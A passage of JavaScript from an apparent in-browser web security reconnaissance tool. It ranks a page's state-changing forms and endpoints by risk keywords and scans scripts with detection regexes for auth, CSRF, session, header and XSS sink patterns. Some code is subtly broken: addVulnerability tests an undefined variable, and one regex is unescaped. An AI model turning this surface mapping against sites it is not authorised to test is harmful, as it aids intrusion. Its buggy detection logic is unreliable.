              source: "javascript_analysis"
            });
          }
        }
      });

      console.log(`📊 Extracted ${flows.length} event handlers from code analysis`);
    }

    //  Identify state-changing operations
    identifyStateChangers() {
      console.log(
        "%c🔄 IDENTIFYING STATE CHANGERS...",
        "color: pink; font-weight: bold;"
      );

      const stateChangers = [];

      // Forms with POST/PUT methods
      document.querySelectorAll("form").forEach((form) => {
        const method = (form.method || "GET").toUpperCase();
        if (["POST", "PUT", "PATCH", "DELETE"].includes(method)) {
          stateChangers.push({
            type: "form",
            element: form,
            action: form.action,
            method: method,
            riskLevel: this.assessStateChangeRisk(form.action, method),
          });
        }
      });

      // AJAX calls in JavaScript
      this.discoveredEndpoints.forEach((endpoint) => {
        endpoint.metadata.forEach((meta) => {
          if (
            meta.method &&
            ["POST", "PUT", "PATCH", "DELETE"].includes(
              meta.method.toUpperCase()
            )
          ) {
            stateChangers.push({
              type: "ajax",
              url: endpoint.url,
              method: meta.method,
              riskLevel: this.assessStateChangeRisk(endpoint.url, meta.method),
            });
          }
        });
      });

      this.displayStateChangers(stateChangers);
      return stateChangers;
    }

    // 🏗️ Assess state change risk
    assessStateChangeRisk(url, method) {
      const riskKeywords = [
        "delete", "remove", "destroy", "admin", "manage", "payment", "checkout", "transfer", "withdraw", "password", "email", "settings", "profile",
        "login","logout","register","signup","signin","account","user","username","credential","auth","authentication","authorize","authorization",
        "token","apikey","apikeys","secret","secrets","key","keys","pin","otp","mfa","2fa","security","secure","lock","unlock","session","sessions","cookie","cookies","csrf","xsrf","ssn","socialsecurity","creditcard","cardnumber","cvv","iban","swift","routing","bank","banking","accountnumber","sortcode","transaction","transactions","wire","deposit","withdrawal","loan","mortgage","investment","invest","portfolio","fund","funds","wallet","crypto","cryptocurrency","bitcoin","ethereum",
        "nft","blockchain","exchange","trading","trade","buy","sell","order","orders","invoice","invoices","billing","bill","subscription","subscriptions","plan","plans","upgrade","downgrade","cancel","cancellation","terminate","termination","refund","chargeback","paymentmethod","payee","payer","beneficiary","recipient","sendmoney","receivemoney","remittance","payout","salary","payroll","bonus","commission",
        "tax","taxes","vat","gst","ssnnumber","nationalid","passport","driverlicense","license","permit","dob","birthdate","birth","address","homeaddress",
        "residence","residency","mailingaddress","shippingaddress","billingaddress","phone","phonenumber","mobile","cell","contact","emergencycontact","emailaddress","emailid","messaging","chat","message","messages","dm",
        "directmessage","inbox","outbox","send","receive","post","comment","comments","reply","replies","like","likes","follow","follower","followers","unfollow","share","shares","retweet","tweet","tweets","story","stories","feed","timeline","wall","profilepic","avatar","coverphoto","bio","about","description","status","update","updates","activity","activities","event","events","calendar","schedule","appointment","booking","reservation",
        "checkin","checkout","travel","trip","journey","flight","flights","ticket","tickets","boardingpass","hotel","hotels","room","rooms","stay","guest","guests","host","hosting","hostel","airbnb","property","properties","realestate","land","plot","house","apartment","flat","villa","condo","mortgageaccount","lease","rent","rental","tenant",
        "landlord","ownership","title","deed","insurance","policy","policies","claim","claims","coverage","premium","premiums","benefit","benefits","pension","retirement","health","healthcare","medical","medicare","medicaid","doctor","hospital","clinic","pharmacy","prescription","drug","drugs","treatment","therapy","surgery","operation","emergency","ambulance","blood","donor","donation","charity","ngo",
        "nonprofit","fundraising","campaign","petition","vote","voting","election","candidate","campaigns","donate","donations","gift","gifts","present","presents","coupon","coupons","voucher","vouchers","discount","discounts","offer","offers","promo","promos","promotion","promotions","deal","deals","sale","sales","clearance","bargain","auction","bid","bids"
      ];
      const urlLower = url.toLowerCase();
      const keywordMatches = riskKeywords.filter((keyword) =>
        urlLower.includes(keyword)
      );

      if (keywordMatches.length > 0) {
        return method === "DELETE" ? "CRITICAL" : "HIGH";
      }

      return method === "POST" ? "MEDIUM" : "LOW";
    }

    // 📊 Display state changers
    displayStateChangers(stateChangers) {
      console.log("\n🔄 STATE-CHANGING OPERATIONS:");
      console.log("═".repeat(40));

      const grouped = this.groupBy(stateChangers, "riskLevel");

      ["CRITICAL", "HIGH", "MEDIUM", "LOW"].forEach((level) => {
        if (grouped[level]) {
          console.log(
            `\n${this.getRiskEmoji(level)} ${level} RISK (${
              grouped[level].length
            } operations):`
          );
          grouped[level].forEach((op) => {
            const target = op.action || op.url;
            console.log(`  ${op.method} ${target}`);
          });
        }
      });
    }

    // 🛡️ Find gatekeeper functions
    findGatekeepers() {
      console.log(
        "%c🛡️ FINDING GATEKEEPER FUNCTIONS...",
        "color: lightgreen; font-weight: bold;"
      );

      const gatekeepers = [];

      // Authentication checks
      this.findAuthGatekeepers(gatekeepers);

      // Authorization checks
      this.findAuthzGatekeepers(gatekeepers);

      // CSRF protection
      this.findCSRFGatekeepers(gatekeepers);

      // Rate limiting
      this.findRateLimitGatekeepers(gatekeepers);

      // Enhanced: Additional security checks
      this.findInputValidationGatekeepers(gatekeepers);
      this.findEncryptionGatekeepers(gatekeepers);
      this.findLoggingGatekeepers(gatekeepers);
      this.findSessionManagementGatekeepers(gatekeepers);
      this.findErrorHandlingGatekeepers(gatekeepers);
      this.findAuditLoggingGatekeepers(gatekeepers);
      this.findSecurityHeadersGatekeepers(gatekeepers);

      this.displayGatekeepers(gatekeepers);
      return gatekeepers;
    }

    // 👮 Find authorization gatekeepers
    findAuthzGatekeepers(gatekeepers) {
      const authzPatterns = [
        /hasPermission|checkRole|isAdmin|canAccess/g,
        /role\s*===|permission\s*includes/g,
        /if\s*\(\s*!.*admin/g,

        // New high-confidence additions
        /isSuperAdmin|isModerator|isOwner/g,                       // Other privileged roles
        /hasRole|userHasRole|requireRole/g,                        // Role-based checks
        /requirePermission|hasAccess|grantAccess|denyAccess/g,     // Permission checks
        /accessControl|acl\./gi,                                   // Access control lists
        /rbac|abac/gi,                                              // Role/attribute-based access control
        /checkAccess|verifyAccess|validateAccess/g,                // Access verification
        /authorize|authorizationRequired/g,                        // Authorization enforcement
        /enforcePermissions|enforceRole/g,                         // Enforcement functions
        /privilege.*check|check.*privilege/gi,                      // Privilege checks
        /securityContext|getAuthorities|getRoles/gi,               // Java/Spring Security
        /@PreAuthorize|@Secured|@RolesAllowed/gi,                   // Java annotations
        /before_action\s+:authenticate/gi,                         // Rails before_action auth
        /policy\./gi,                                               // Policy-based authorization
        /Gate::allows|Gate::denies/gi,                              // Laravel Gates
        /can\s*\(|cannot\s*\(/gi,                                   // Laravel/Symfony can() checks
        /user\.isAuthorized|user\.permissions/gi,                   // Generic user permission checks
        /currentUser\.role|currentUser\.permissions/gi,             // Current user role/perm
        /checkUserAccess|validateUserRole/gi,                       // Custom access functions
        /permissionDenied|accessDenied|unauthorized/gi,             // Denial messages
        /forbid|forbidden/gi                                        // Explicit forbid keywords
      ];

      this.scanScriptsForPatterns(authzPatterns, "AUTHORIZATION", gatekeepers);
    }

    // 🛡️ Find CSRF gatekeepers
    findCSRFGatekeepers(gatekeepers) {
      const csrfPatterns = [
        /csrf[_-]?token|_token|authenticity[_-]?token/g,
        /X-CSRF-TOKEN|X-Requested-With/g,

        // New high-confidence additions
        /xsrf[_-]?token/gi,                                   // Alternate CSRF naming
        /anti[_-]?csrf/gi,                                    // Anti-CSRF references
        /csrfmiddlewaretoken/gi,                              // Django CSRF token
        /__RequestVerificationToken/gi,                       // ASP.NET MVC anti-forgery token
        /OWASP\.CSRFGuard/gi,                                 // OWASP CSRFGuard library
        /SynchronizerTokenPattern/gi,                         // Synchronizer token pattern
        /csrf_protect/gi,                                     // Django csrf_protect decorator
        /csrf_exempt/gi,                                      // Django csrf_exempt decorator
        /csrf_field\s*\(/gi,                                  // Laravel csrf_field()
        /@csrf\b/gi,                                          // Laravel Blade @csrf directive
        /csrf_meta_tags/gi,                                   // Rails csrf_meta_tags
        /protect_from_forgery/gi,                             // Rails protect_from_forgery
        /double[_-]?submit/gi,                                // Double submit cookie pattern
        /sameSite\s*=\s*(Strict|Lax|None)/gi,                  // SameSite cookie attribute
        /Origin\s*:/gi,                                       // Origin header
        /Referer\s*:/gi,                                      // Referer header
        /X-XSRF-TOKEN/gi,                                     // Angular default XSRF header
        /csrfToken\s*\(/gi,                                   // Express.js/Laravel csrfToken()
        /generateCsrfToken|validateCsrfToken/gi,              // Generic CSRF token functions
        /antiForgeryToken/gi,                                 // ASP.NET anti-forgery token
        /form_key/gi,                                         // Magento form key
        /form_build_id/gi,                                    // Drupal form build ID
        /csrf_check/gi,                                       // Generic CSRF check
        /csrf_cookie/gi,                                      // CSRF cookie name
        /csrf_param/gi                                        // Rails csrf_param
      ];
      this.scanScriptsForPatterns(csrfPatterns, "CSRF", gatekeepers);

      // Check forms for CSRF tokens
      document.querySelectorAll("form").forEach((form) => {
        const hasCSRF = form.querySelector('[name*="csrf"], [name="_token"]');
        if (!hasCSRF && form.method.toUpperCase() !== "GET") {
          gatekeepers.push({
            type: "CSRF",
            status: "MISSING",
            element: form,
            risk: "HIGH",
            description: "Form missing CSRF protection",
          });
        }
      });
    }

    // 🚦 Find rate limiting gatekeepers
    findRateLimitGatekeepers(gatekeepers) {
      const rateLimitPatterns = [
        /rateLimit|throttle|cooldown/g,
        /429|too.many.requests/g,

        // New high-confidence additions
        /burstLimit/i,                              // Burst limit configs
        /quotaExceeded/i,                           // Quota exceeded messages
        /maxRequestsPer/i,                          // Max requests per time unit
        /requestsPer(Minute|Second|Hour)/i,          // Requests per time unit
        /X-RateLimit-(Limit|Remaining|Reset)/i,     // Common HTTP rate limit headers
        /Retry-After/i,                             // Retry-After header
        /Too\s+Many\s+Attempts/i,                   // Too many attempts message
        /Exceeded\s+Request\s+Limit/i,              // Exceeded request limit
        /Max\s+Concurrent\s+Requests/i,             // Concurrent request limit
        /Abuse\s+Detection/i,                       // Abuse detection triggers
        /SlowDown/i,                                // AWS S3 SlowDown response
        /RequestLimitExceeded/i,                    // AWS API Gateway limit
        /OverQuota/i,                               // Google API over quota
        /DailyLimitExceeded/i,                      // Google API daily limit
        /UserRateLimitExceeded/i,                   // Google API user rate limit
        /BandwidthLimitExceeded/i,                  // Bandwidth limit
        /ConnectionLimitExceeded/i,                 // Connection limit
        /MaxConnections/i,                          // Max connections config
        /Too\s+Many\s+Connections/i,                 // Too many connections message
        /Limit\s+Exceeded/i,                         // Generic limit exceeded
        /Service\s+Unavailable\s+Due\s+To\s+Rate\s+Limiting/i // Explicit rate limit message
      ];

      this.scanScriptsForPatterns(rateLimitPatterns, "RATE_LIMIT", gatekeepers);
    }

    // ✅ Find input validation gatekeepers
    findInputValidationGatekeepers(gatekeepers) {
      const validationPatterns = [
        /validate|saniti[sz]e|escape|encode/g,       // Existing
        /length|min|max|required/g,                  // Existing
        /regex|pattern|match/g,                      // Existing
        /whitelist|blacklist|filter/g,               // Existing

        // New high-confidence additions
        /strip(tags|html)/gi,                         // stripTags, stripHTML
        /xss(clean|filter)/gi,                        // xssClean, xssFilter
        /csrf(token|check|validate)/gi,               // CSRF token validation
        /input(mask|filter|check)/gi,                 // Input masking/filtering
        /is_(email|url|numeric|alpha|alphanumeric)/gi,// Common validation helpers
        /check(input|param|field)/gi,                 // checkInput, checkParam
        /assert(matches|equals|contains)/gi,          // Assertion-based validation
        /type(check|cast|validate)/gi,                // Type checking/casting
        /form_validation/gi,                          // Form validation modules
        /security\.(sanitize|filter)/gi,               // Security sanitization calls
        /safe_(string|html|url)/gi,                   // Safe string/HTML/URL functions
        /htmlspecialchars|htmlentities/gi,            // PHP HTML escaping
        /filter_var\s*\(/gi,                          // PHP filter_var
        /FILTER_(SANITIZE|VALIDATE)_[A-Z_]+/gi,       // PHP filter constants
        /escapeHtml|escapeAttribute|escapeJavaScript/gi, // Escaping helpers
        /encodeURI(Component)?/gi,                    // JS encodeURI / encodeURIComponent
        /decodeURI(Component)?/gi,                    // JS decodeURI / decodeURIComponent
        /urlencode|urldecode/gi,                      // URL encoding/decoding
        /stripos|strpos/gi,                           // String position checks (input scanning)
        /preg_match|preg_replace/gi,                  // PHP regex validation
        /re\.match|re\.search/gi,                     // Python regex validation
        /Pattern\.compile/gi,                         // Java regex validation
        /matcher\.matches/gi,                         // Java regex matcher
        /StringUtils\.(isNotEmpty|isEmpty|isNumeric)/gi, // Apache Commons validation
        /Validator\./gi,                              // Generic Validator class usage
        /express-validator/gi,                        // Node.js express-validator
        /joi\./gi,                                    // Joi validation library
        /yup\./gi,                                    // Yup validation library
        /zod\./gi                                     // Zod validation library
      ];

      this.scanScriptsForPatterns(validationPatterns, "INPUT_VALIDATION", gatekeepers);
    }

    // 🔐 Find encryption gatekeepers
    findEncryptionGatekeepers(gatekeepers) {
      const encryptionPatterns = [
        /crypto|encrypt|decrypt|hash/g,
        /AES|RSA|SHA|bcrypt|scrypt/g,
        /ssl|tls|https|secure/g,
        /certificate|key|token/g,

        // New high-confidence additions
        /md5|sha[-_]?(1|224|256|384|512)/gi,           // Common hash algorithms
        /pbkdf2|argon2/gi,                             // Key derivation functions
        /hmac|hkdf/gi,                                 // Message authentication codes
        /digital\s*signature/gi,                       // Digital signature references
        /sign\(|verify\(/gi,                           // Signing/verification functions
        /keystore|truststore/gi,                       // Java key/trust stores
        /pkcs(7|8|12)?/gi,                             // PKCS formats
        /x509|asn1/gi,                                 // Certificate formats
        /gpg|pgp/gi,                                   // GPG/PGP encryption
        /openssl/gi,                                   // OpenSSL usage
        /javax\.crypto/gi,                             // Java crypto package
        /Cipher\.getInstance/gi,                       // Java cipher creation
        /SecretKey|PublicKey|PrivateKey/gi,            // Java key classes
        /SecureRandom/gi,                              // Java secure RNG
        /CryptoJS/gi,                                  // CryptoJS library
        /window\.crypto/gi,                            // Web Crypto API
        /subtle\.encrypt|subtle\.decrypt/gi,           // Web Crypto encrypt/decrypt
        /subtle\.digest/gi,                            // Web Crypto hashing
        /libsodium/gi,                                 // Libsodium crypto library
        /NaCl/gi,                                      // NaCl crypto library
        /ed25519|curve25519/gi,                        // Modern ECC curves
        /secp256k1/gi,                                 // Bitcoin/Ethereum curve
        /randomBytes|randomUUID/gi,                    // Secure random generation
        /jwt|jws|jwe/gi,                               // JSON Web Tokens
        /base64url/gi,                                 // Base64 URL-safe encoding
        /DER|PEM/gi,                                   // Certificate encodings
        /salt(ed)?/gi,                                 // Salt usage in crypto
        /iv|initializationVector/gi                    // Initialization vector
      ];

      this.scanScriptsForPatterns(encryptionPatterns, "ENCRYPTION", gatekeepers);
    }

    // 📝 Find logging gatekeepers
    findLoggingGatekeepers(gatekeepers) {
      const loggingPatterns = [
        /console\.log|console\.error|console\.warn/g,
        /log|trace|debug|info/g,
        /audit|monitor|track/g,
        /alert|notify|report/g,

        // New high-confidence additions
        /Logger\.(log|info|warn|error|fatal)/gi,             // Common logging libraries
        /log4j|slf4j|logback/gi,                             // Java logging frameworks
        /java\.util\.logging/gi,                             // Java built-in logging
        /logging\.(debug|info|warning|error|critical)/gi,    // Python logging module
        /traceback\.print_exc/gi,                            // Python error trace
        /sys\.log|syslog/gi,                                 // System logging
        /winston\.(log|info|warn|error)/gi,                  // Node.js Winston logger
        /bunyan\.(info|warn|error)/gi,                       // Node.js Bunyan logger
        /pino\.(info|warn|error)/gi,                         // Node.js Pino logger
        /debug\([^)]+\)/gi,                                  // Node.js debug module
        /print\(/gi,                                         // Python print (used for logging)
        /console\.table|console\.dir/gi,                     // Console inspection
        /eventEmitter\.emit\(/gi,                            // Event-based logging
        /telemetry|instrumentation/gi,                       // Monitoring hooks
        /newrelic|datadog|appdynamics|sentry|rollbar/gi,     // Third-party monitoring tools
        /Bugsnag|Honeybadger|LogRocket/gi,                   // Client-side error trackers
        /trackEvent|trackPageView|trackException/gi,         // Analytics tracking
        /window\.onerror|window\.addEventListener\(['"]error/gi, // JS error listeners
        /captureMessage|captureException/gi,                 // Sentry-style logging
        /eventLog|activityLog|accessLog/gi,                  // Log naming conventions
        /writeLog|saveLog|appendLog/gi                       // File-based logging
      ];
      this.scanScriptsForPatterns(loggingPatterns, "LOGGING", gatekeepers);
    }

    // 🔐 Find session management gatekeepers
    findSessionManagementGatekeepers(gatekeepers) {
      const sessionPatterns = [
        /sessionStorage|localStorage/g,
        /cookie|document\.cookie/g,
        /session.*id|session.*token/g,
        /expires|max-age|secure|httponly|samesite/g,
        /setCookie|getCookie/g,

        // New high-confidence additions
        /req\.session|res\.session/g,                        // Express.js session handling
        /express-session|cookie-session/g,                   // Node.js session middleware
        /passport\.session/g,                                // Passport.js session integration
        /JWT|access[_-]?token|refresh[_-]?token/g,            // Token-based session identifiers
        /Authorization\s*[:=]/g,                              // Auth header for session tokens
        /Bearer\s+[a-zA-Z0-9\-_\.]+/g,                        // Bearer token format
        /csrf[_-]?token|xsrf[_-]?token/g,                     // CSRF token handling
        /remember[_-]?me/g,                                   // Persistent login/session
        /login[_-]?token|auth[_-]?token/g,                    // Auth token references
        /invalidate.*session|destroy.*session/g,              // Session termination
        /session_start|session_destroy/g,                     // PHP session lifecycle
        /$_SESSION\s*\[/g,                                    // PHP session variable access
        /HttpSession|getSession\(/g,                          // Java servlet session handling
        /SessionManager|SessionFactory/g,                     // Java session management classes
        /Flask-Session|flask\.session/g,                      // Python Flask session
        /DjangoSession|request\.session/g,                    // Django session handling
        /SecureRandom.*session/g,                             // Secure session ID generation
        /SameSite=None|SameSite=Strict|SameSite=Lax/g,        // Cookie SameSite policies
        /Set-Cookie\s*:/gi,                                   // Set-Cookie header
        /Cookie\s*:/gi,                                       // Cookie header
        /session.*timeout|session.*expiry/g                   // Session expiration configs
      ];

      this.scanScriptsForPatterns(sessionPatterns, "SESSION_MANAGEMENT", gatekeepers);
    }

    // 🚨 Find error handling gatekeepers
    findErrorHandlingGatekeepers(gatekeepers) {
      const errorPatterns = [
  /try\s*\{|catch\s*\(/g,
  /throw\s+new\s+Error/g,
  /window\.onerror/g,
  /error|exception|stack/i,
  /finally\s*\{/g,

  // New high-confidence additions
  /console\.error\s*\(/i,                        // Logging errors to console
  /console\.warn\s*\(/i,                         // Logging warnings
  /process\.on\s*\(\s*['"`]uncaughtException['"`]/i, // Node.js uncaught exception handler
  /process\.on\s*\(\s*['"`]unhandledRejection['"`]/i, // Node.js unhandled promise rejection
  /addEventListener\s*\(\s*['"`]error['"`]/i,    // JS error event listener
  /addEventListener\s*\(\s*['"`]unhandledrejection['"`]/i, // JS unhandled rejection listener
  /window\.addEventListener\s*\(\s*['"`]error['"`]/i,
  /window\.addEventListener\s*\(\s*['"`]unhandledrejection['"`]/i,
  /Logger\.(error|warn|fatal)/i,                 // Common logger error levels
  /log4j/i,                                      // Java Log4j logging
  /SLF4J/i,                                      // Java SLF4J logging
  /org\.slf4j/i,                                 // SLF4J package
  /java\.util\.logging/i,                        // Java logging package
  /logging\.(error|warning|exception)/i,         // Python logging module
  /traceback\.print_exc/i,                       // Python traceback printing
  /sys\.exc_info/i,                              // Python sys.exc_info
  /Exception\.printStackTrace/i,                 // Java stack trace printing
  /printStackTrace\s*\(/i,                       // Generic stack trace printing
  /die\s*\(/i,                                   // PHP die()
  /exit\s*\(/i,                                  // PHP exit()
  /trigger_error\s*\(/i,                         // PHP trigger_error
  /set_error_handler\s*\(/i,                     // PHP custom error handler
  /set_exception_handler\s*\(/i,                 // PHP custom exception handler
  /@ExceptionHandler/i,                          // Spring Boot exception handler
  /ResponseStatusException/i,                    // Spring Boot exception
  /Sentry\.captureException/i,                   // Sentry error tracking
  /Raven\.captureException/i,                    // Legacy Sentry client
  /Bugsnag\.notify/i,                             // Bugsnag error reporting
  /Rollbar\.error/i,                              // Rollbar error reporting
  /Honeybadger\.notify/i                          // Honeybadger error reporting
];

      this.scanScriptsForPatterns(errorPatterns, "ERROR_HANDLING", gatekeepers);
    }

    // 📊 Find audit logging gatekeepers
    findAuditLoggingGatekeepers(gatekeepers) {
      const auditPatterns = [
  /audit|log.*event|track.*action/g,
  /user.*activity|user.*action/g,
  /security.*event|auth.*event/g,
  /compliance|regulation/g,
  /monitor.*user|track.*user/g,

  // New high-confidence additions
  /access.*log/i,                              // Access log references
  /activity.*log/i,                            // Activity log references
  /event.*log/i,                               // Event log references
  /transaction.*log/i,                         // Transaction logging
  /change.*log/i,                              // Change log tracking
  /admin.*log/i,                               // Admin action logging
  /privilege.*log/i,                           // Privilege change logging
  /security.*log/i,                            // Security log references
  /forensic.*log/i,                            // Forensic logging
  /auditTrail/i,                               // Audit trail keyword
  /trackingId/i,                               // Tracking identifiers
  /session.*log/i,                             // Session logging
  /login.*attempt/i,                           // Login attempt tracking
  /failed.*login/i,                            // Failed login tracking
  /successful.*login/i,                        // Successful login tracking
  /logout.*event/i,                            // Logout event tracking
  /password.*change.*log/i,                    // Password change logging
  /role.*change.*log/i,                        // Role/permission change logging
  /policy.*violation/i,                        // Policy violation tracking
  /gdpr|hipaa|pci[-_]?dss/i,                    // Compliance frameworks
  /data.*retention.*policy/i,                   // Data retention policy
  /securityIncident/i,                         // Security incident tracking
  /incident.*report/i,                         // Incident reporting
  /breach.*log/i,                              // Breach logging
  /alert.*trigger/i,                           // Alert triggers
  /SIEM/i,                                     // Security Information and Event Management
  /splunk/i,                                   // Splunk logging
  /elk.*stack/i,                               // ELK stack logging
  /logstash/i,                                 // Logstash usage
  /graylog/i,                                  // Graylog usage
  /datadog/i,                                  // Datadog monitoring
  /newrelic/i,                                 // New Relic monitoring
  /appdynamics/i                               // AppDynamics monitoring
];

      this.scanScriptsForPatterns(auditPatterns, "AUDIT_LOGGING", gatekeepers);
    }

    // 🛡️ Find security headers gatekeepers
    findSecurityHeadersGatekeepers(gatekeepers) {
  const securityPatterns = [
    /Content-Security-Policy|X-Frame-Options|X-Content-Type-Options/g,
    /Strict-Transport-Security|X-XSS-Protection/g,
    /Referrer-Policy|Feature-Policy/g,
    /helmet|security.*headers/g,

    // New high-confidence additions
    /Permissions-Policy|Cross-Origin-Embedder-Policy|Cross-Origin-Opener-Policy/g, // Modern browser security headers
    /Cross-Origin-Resource-Policy|Origin-Agent-Cluster/g,                         // Cross-origin restrictions
    /Expect-CT|NEL|Report-To/g,                                                    // Certificate transparency & reporting
    /Cache-Control|Pragma|Expires/g,                                               // Cache control for sensitive data
    /Access-Control-Allow-Origin|Access-Control-Allow-Methods/g,                   // CORS headers
    /Access-Control-Allow-Headers|Access-Control-Allow-Credentials/g,              // CORS security configs
    /Public-Key-Pins|Pin-SHA256/g,                                                  // HPKP (deprecated but still seen)
    /Sec-Fetch-Site|Sec-Fetch-Mode|Sec-Fetch-Dest/g,                                // Fetch metadata request headers
    /Sec-WebSocket-Accept|Sec-WebSocket-Key/g,                                     // WebSocket handshake security
    /Authorization|Proxy-Authorization/g,                                          // Auth headers
    /WWW-Authenticate/g,                                                           // Auth challenge header
    /Set-Cookie.*(HttpOnly|Secure|SameSite)/gi,                                     // Secure cookie attributes
    /ETag|Last-Modified/g,                                                          // Potential cache validators
    /Forwarded|X-Forwarded-For|X-Forwarded-Proto/g,                                 // Proxy headers
    /X-DNS-Prefetch-Control/g,                                                      // DNS prefetch control
    /X-Download-Options/g,                                                          // IE download security
    /X-Permitted-Cross-Domain-Policies/g,                                           // Flash cross-domain policy
    /X-Robots-Tag/g,                                                                // Search engine indexing control
    /X-UA-Compatible/g,                                                             // IE compatibility mode
    /X-Powered-By/g,                                                                // Tech stack disclosure
    /Server/g                                                                       // Server banner disclosure
  ];

      this.scanScriptsForPatterns(securityPatterns, "SECURITY_HEADERS", gatekeepers);
    }

    // 🔍 Scan scripts for patterns
    scanScriptsForPatterns(patterns, type, gatekeepers) {
      const scripts = Array.from(document.querySelectorAll("script"));
      const jsContent = scripts.map((s) => s.innerHTML).join("\n");

      patterns.forEach((pattern) => {
        let match;
        const matches = new Set(); // Use Set to avoid duplicates
        while ((match = pattern.exec(jsContent)) !== null) {
          const matchStr = match[0];
          if (!matches.has(matchStr)) {
            matches.add(matchStr);
            gatekeepers.push({
              type: type,
              status: "FOUND",
              pattern: matchStr,
              risk: "LOW",
              description: `${type} gatekeeper detected`,
            });
          }
        }
      });
    }

    // 📊 Display gatekeepers
    displayGatekeepers(gatekeepers) {
      console.log("\n🛡️ GATEKEEPER FUNCTIONS:");
      console.log("═".repeat(35));

      const grouped = this.groupBy(gatekeepers, "type");

      Object.entries(grouped).forEach(([type, items]) => {
        console.log(`\n${type}:`);
        items.slice(0, 5).forEach((item) => { // Show first 5
          const status = item.status === "FOUND" ? "✅" : "❌";
          console.log(`  ${status} ${item.pattern || item.description}`);
        });
        if (items.length > 5) {
          console.log(`  ... and ${items.length - 5} more patterns`);
        }
      });
    }

    // 🔍 Vulnerability detection helpers
    hasXSSPattern(code) {
      const xssPatterns = [
        /innerHTML\s*=/,
        /document\.write/,
        /eval\s*\(/,
        /outerHTML\s*=/,

        // New high-confidence additions
        /document\.writeln\s*\(/,                          // Similar to document.write
        /insertAdjacentHTML\s*\(/,                         // HTML injection
        /Range\.createContextualFragment\s*\(/,            // Dangerous HTML fragment creation
        /DOMParser\s*\(\)\.parseFromString\s*\(.*text\/html/i, // Parsing HTML strings
        /setAttribute\s*\(\s*['"`]on\w+['"`]/i,            // Setting event handler attributes
        /srcdoc\s*=/i,                                     // iframe srcdoc injection
        /iframe\.contentWindow\.document\.write\s*\(/i,    // Writing into iframe
        /window\.open\s*\(\s*['"`]javascript:/i,           // JS protocol navigation
        /location\.(assign|replace)\s*\(\s*['"`]javascript:/i, // JS redirects
        /new\s+Function\s*\(/i,                            // Function constructor
        /setTimeout\s*\(\s*['"`]/i,                        // String-based setTimeout
        /setInterval\s*\(\s*['"`]/i,                       // String-based setInterval
        /on\w+\s*=\s*['"`].*<script>/i,                    // Inline event handler with script tag
        /<script[^>]*>.*<\/script>/i,                      // Embedded script tags
        /javascript\s*:/i,                                 // JS protocol in href/src
        /data\s*:\s*text\/html/i,                          // Data URI with HTML content
        /location\.href\s*=\s*['"`]data:/i,                // Redirect to data URI
        /document\.cookie\s*=/i,                           // Cookie manipulation
        /localStorage\.setItem\s*\(/i,                     // LocalStorage injection
        /sessionStorage\.setItem\s*\(/i                    // SessionStorage injection
      ];

      return xssPatterns.some((pattern) => pattern.test(code));
    }

    hasUnsafeDOMPattern(code) {
      const unsafePatterns = [
        /\.innerHTML\s*=.*\+/,                              // Existing
        /insertAdjacentHTML/,                               // Existing
        /document\.createElement.*innerHTML/,               // Existing

        // New high-confidence additions
        /\.outerHTML\s*=.*\+/,                              // OuterHTML assignment with concatenation
        /document\.write\s*\(/,                             // document.write()
        /document\.writeln\s*\(/,                           // document.writeln()
        /Range\.createContextualFragment\s*\(/,             // Dangerous HTML fragment creation
        /DOMParser\s*\(\)\.parseFromString\s*\(.*text\/html/i, // Parsing HTML strings
        /element\.setAttribute\s*\(\s*['"`]on\w+['"`]/i,    // Setting event handler attributes
        /element\.setAttribute\s*\(\s*['"`]srcdoc['"`]/i,   // Setting srcdoc attribute
        /srcdoc\s*=/i,                                      // Direct srcdoc assignment
        /iframe\.contentWindow\.document\.write\s*\(/i,     // Writing into iframe document
        /window\.location\s*=\s*['"`]javascript:/i,         // JS protocol navigation
        /location\.assign\s*\(\s*['"`]javascript:/i,        // JS protocol via assign()
        /location\.replace\s*\(\s*['"`]javascript:/i,       // JS protocol via replace()
        /setTimeout\s*\(\s*['"`]/i,                         // String-based setTimeout
        /setInterval\s*\(\s*['"`]/i,                        // String-based setInterval
        /eval\s*\(/i,                                       // eval()
        /new\s+Function\s*\(/i,                             // Function constructor
        /importScripts\s*\(\s*['"`]data:/i,                 // Importing scripts from data: URLs
        /fetch\s*\(\s*['"`]data:/i,                         // Fetching from data: URLs
        /XMLHttpRequest\s*\(/i,                             // Raw XHR creation
        /ActiveXObject\s*\(\s*['"`]Microsoft\.XMLHTTP['"`]\s*\)/i // Legacy IE XHR
      ];

      return unsafePatterns.some((pattern) => pattern.test(code));
    }
    
    // Enhanced DOM XSS detection
    hasDOMXSSPattern(code) {
      const domXssPatterns = [
        /location\.(hash|search|pathname)/,
        /document\.URL/,
        /document\.documentURI/,
        /document\.location/,
        /window\.location/,
        /document\.referrer/,
        /document\.cookie/,
        /localStorage\.getItem/,
        /sessionStorage\.getItem/,
        /\$\(.*\)\.html\(/,
        /jQuery\(.*\)\.html\(/
      ];

      return domXssPatterns.some((pattern) => pattern.test(code));
    }


    // 🚨 Add vulnerability
    addVulnerability(type, severity, details) {
      const domXssPatterns = [
        /location\.(hash|search|pathname)/,
        /document\.URL/,
        /document\.documentURI/,
        /document\.location/,
        /window\.location/,
        /document\.referrer/,
        /document\.cookie/,
        /localStorage\.getItem/,
        /sessionStorage\.getItem/,
        /\$\(.*\)\.html\(/,
        /jQuery\(.*\)\.html\(/,

  // New high-confidence additions
  /document\.write\s*\(/,                              // Direct HTML injection
  /document\.writeln\s*\(/,                            // Direct HTML injection
  /element\.innerHTML\s*=/,                            // Setting innerHTML
  /element\.outerHTML\s*=/,                            // Setting outerHTML
  /insertAdjacentHTML\s*\(/,                           // Inserting HTML
  /Range\.createContextualFragment\s*\(/,              // Parsing HTML fragments
  /DOMParser\s*\(\)\.parseFromString\s*\(.*text\/html/i, // Parsing HTML strings
  /setAttribute\s*\(\s*['"`]on\w+['"`]/i,              // Setting event handler attributes
  /srcdoc\s*=/i,                                       // Setting iframe srcdoc
  /iframe\.contentWindow\.document\.write\s*\(/i,      // Writing into iframe
  /window\.open\s*\(\s*['"`]javascript:/i,             // JS protocol in window.open
  /location\.(assign|replace)\s*\(\s*['"`]javascript:/i, // JS protocol redirects
  /eval\s*\(/i,                                        // eval execution
  /new\s+Function\s*\(/i,                              // Function constructor
  /setTimeout\s*\(\s*['"`]/i,                          // String-based setTimeout
  /setInterval\s*\(\s*['"`]/i,                         // String-based setInterval
  /importScripts\s*\(\s*['"`]data:/i,                  // Importing scripts from data: URLs
  /fetch\s*\(\s*['"`]data:/i                           // Fetching from data: URLs
];

      return domXssPatterns.some((pattern) => pattern.test(code));
    }

    // SQL Injection detection
